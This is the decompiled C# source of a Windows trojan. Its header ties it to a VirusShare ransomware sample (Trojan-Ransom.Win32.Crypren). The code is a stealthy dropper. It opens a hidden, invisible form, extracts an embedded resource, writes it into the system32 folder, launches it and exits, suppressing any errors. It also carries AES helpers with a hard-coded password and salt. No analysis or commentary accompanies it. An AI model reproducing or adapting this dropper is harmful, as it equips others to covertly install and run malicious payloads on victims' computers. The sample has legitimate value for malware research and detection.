// Decompiled with JetBrains decompiler
// Type: YoshistrCrypto.Form1
// Assembly: 111111, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B59DA4E3-7A19-4BA8-BF7C-2788DBBABBA9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Crypren.acsw-84583df7fb60851e05dd6cc18a4b7623ce909168e73651ec374cb4d49d4d7598.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using YoshistrCrypto.Properties;

namespace YoshistrCrypto
{
  public class Form1 : Form
  {
    private IContainer components;
    public static string Password = "EMTPYPASSWORD";

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    public Form1() => this.InitializeComponent();

    public static string encyptor(string inC)
    {
      byte[] bytes = Encoding.Unicode.GetBytes(inC);
      PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Form1.Password, new byte[13]
      {
        (byte) 73,
        (byte) 118,
        (byte) 97,
        (byte) 110,
        (byte) 32,
        (byte) 77,
        (byte) 101,
        (byte) 100,
        (byte) 118,
        (byte) 101,
        (byte) 100,
        (byte) 101,
        (byte) 118
      });
      return Convert.ToBase64String(Form1.Encrypt(bytes, passwordDeriveBytes.GetBytes(32), passwordDeriveBytes.GetBytes(16)));
    }

    public static string dencyptor(string inC)
    {
      byte[] cipherData = Convert.FromBase64String(inC);
      PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Form1.Password, new byte[13]
      {
        (byte) 73,
        (byte) 118,
        (byte) 97,
        (byte) 110,
        (byte) 32,
        (byte) 77,
        (byte) 101,
        (byte) 100,
        (byte) 118,
        (byte) 101,
        (byte) 100,
        (byte) 101,
        (byte) 118
      });
      return Encoding.Unicode.GetString(Form1.Decrypt(cipherData, passwordDeriveBytes.GetBytes(32), passwordDeriveBytes.GetBytes(16)));
    }

    public static byte[] Encrypt(byte[] clearData, byte[] Key, byte[] IV)
    {
      MemoryStream memoryStream = new MemoryStream();
      Rijndael rijndael = Rijndael.Create();
      rijndael.Key = Key;
      rijndael.IV = IV;
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write);
      cryptoStream.Write(clearData, 0, clearData.Length);
      cryptoStream.Close();
      return memoryStream.ToArray();
    }

    public static byte[] Decrypt(byte[] cipherData, byte[] Key, byte[] IV)
    {
      MemoryStream memoryStream = new MemoryStream();
      Rijndael rijndael = Rijndael.Create();
      rijndael.Key = Key;
      rijndael.IV = IV;
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
      cryptoStream.Write(cipherData, 0, cipherData.Length);
      cryptoStream.Close();
      return memoryStream.ToArray();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      string str = "";
      string name = "";
      try
      {
        str = Settings.Default.LoadR;
        name = str.Substring(str.LastIndexOf("\\") + 1, str.Length - (str.LastIndexOf("\\") + 1));
      }
      catch (Exception ex)
      {
      }
      try
      {
        str.Substring(str.LastIndexOf("."), str.Length - str.LastIndexOf("."));
        Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
        FileStream fileStream = new FileStream("C:\\WINDOWS\\system32\\" + name, FileMode.Create);
        using (fileStream)
        {
          byte[] buffer = new byte[32768];
          int count;
          while ((count = manifestResourceStream.Read(buffer, 0, buffer.Length)) > 0)
            fileStream.Write(buffer, 0, count);
        }
        fileStream.Close();
        Thread.Sleep(200);
        try
        {
          ThreadPool.QueueUserWorkItem(new WaitCallback(Form1.runProc), (object) ("C:\\WINDOWS\\system32\\" + name));
          Thread.Sleep(500);
          Application.Exit();
        }
        catch (Exception ex)
        {
          Thread.Sleep(200);
          ThreadPool.QueueUserWorkItem(new WaitCallback(Form1.runProc), (object) ("C:\\WINDOWS\\system32\\" + name));
          Thread.Sleep(500);
          Application.Exit();
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.ToString());
      }
    }

    public static void runProc(object discrept)
    {
      try
      {
        Process.Start((string) discrept);
      }
      catch
      {
      }
    }

    public void ExtractFileFromResources(string filename, string location)
    {
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(filename);
      if (manifestResourceStream == null)
        return;
      BinaryReader binaryReader = new BinaryReader(manifestResourceStream);
      BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream(location, FileMode.Create));
      byte[] buffer = new byte[manifestResourceStream.Length];
      manifestResourceStream.Read(buffer, 0, buffer.Length);
      binaryWriter.Write(buffer);
      binaryReader.Close();
      binaryWriter.Close();
      manifestResourceStream.Close();
    }

    public static byte[] StrToByteArray(string str) => new ASCIIEncoding().GetBytes(str);

    public byte[] ReadByteArrayFromFile(string fileName) => new BinaryReader((Stream) new FileStream(fileName, FileMode.Open, FileAccess.Read)).ReadBytes((int) new FileInfo(fileName).Length);
  }
}
